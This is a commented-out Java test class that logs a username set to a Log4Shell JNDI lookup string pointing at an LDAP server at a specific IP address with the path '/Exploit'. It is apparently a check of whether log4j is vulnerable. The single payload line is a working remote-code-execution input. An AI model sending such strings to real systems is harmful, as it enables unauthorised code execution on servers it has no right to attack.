//package com.example.demo.conttroller;
//
//import org.apache.commons.logging.LogFactory;
//import org.apache.logging.log4j.LogManager;
//import org.apache.logging.log4j.Logger;
//
//public class Test {
//    public static final Logger logger = LogManager.getLogger(Test.class);
//    public static void main(String[] args) {
//        String username = "張三";
//        username = "${jndi:ldap://192.73.1.63:1389/Exploit}";
//        login(username);
//
//    }
//
//
//    public static void login(String username){
//        logger.info(username);
//    }
//}
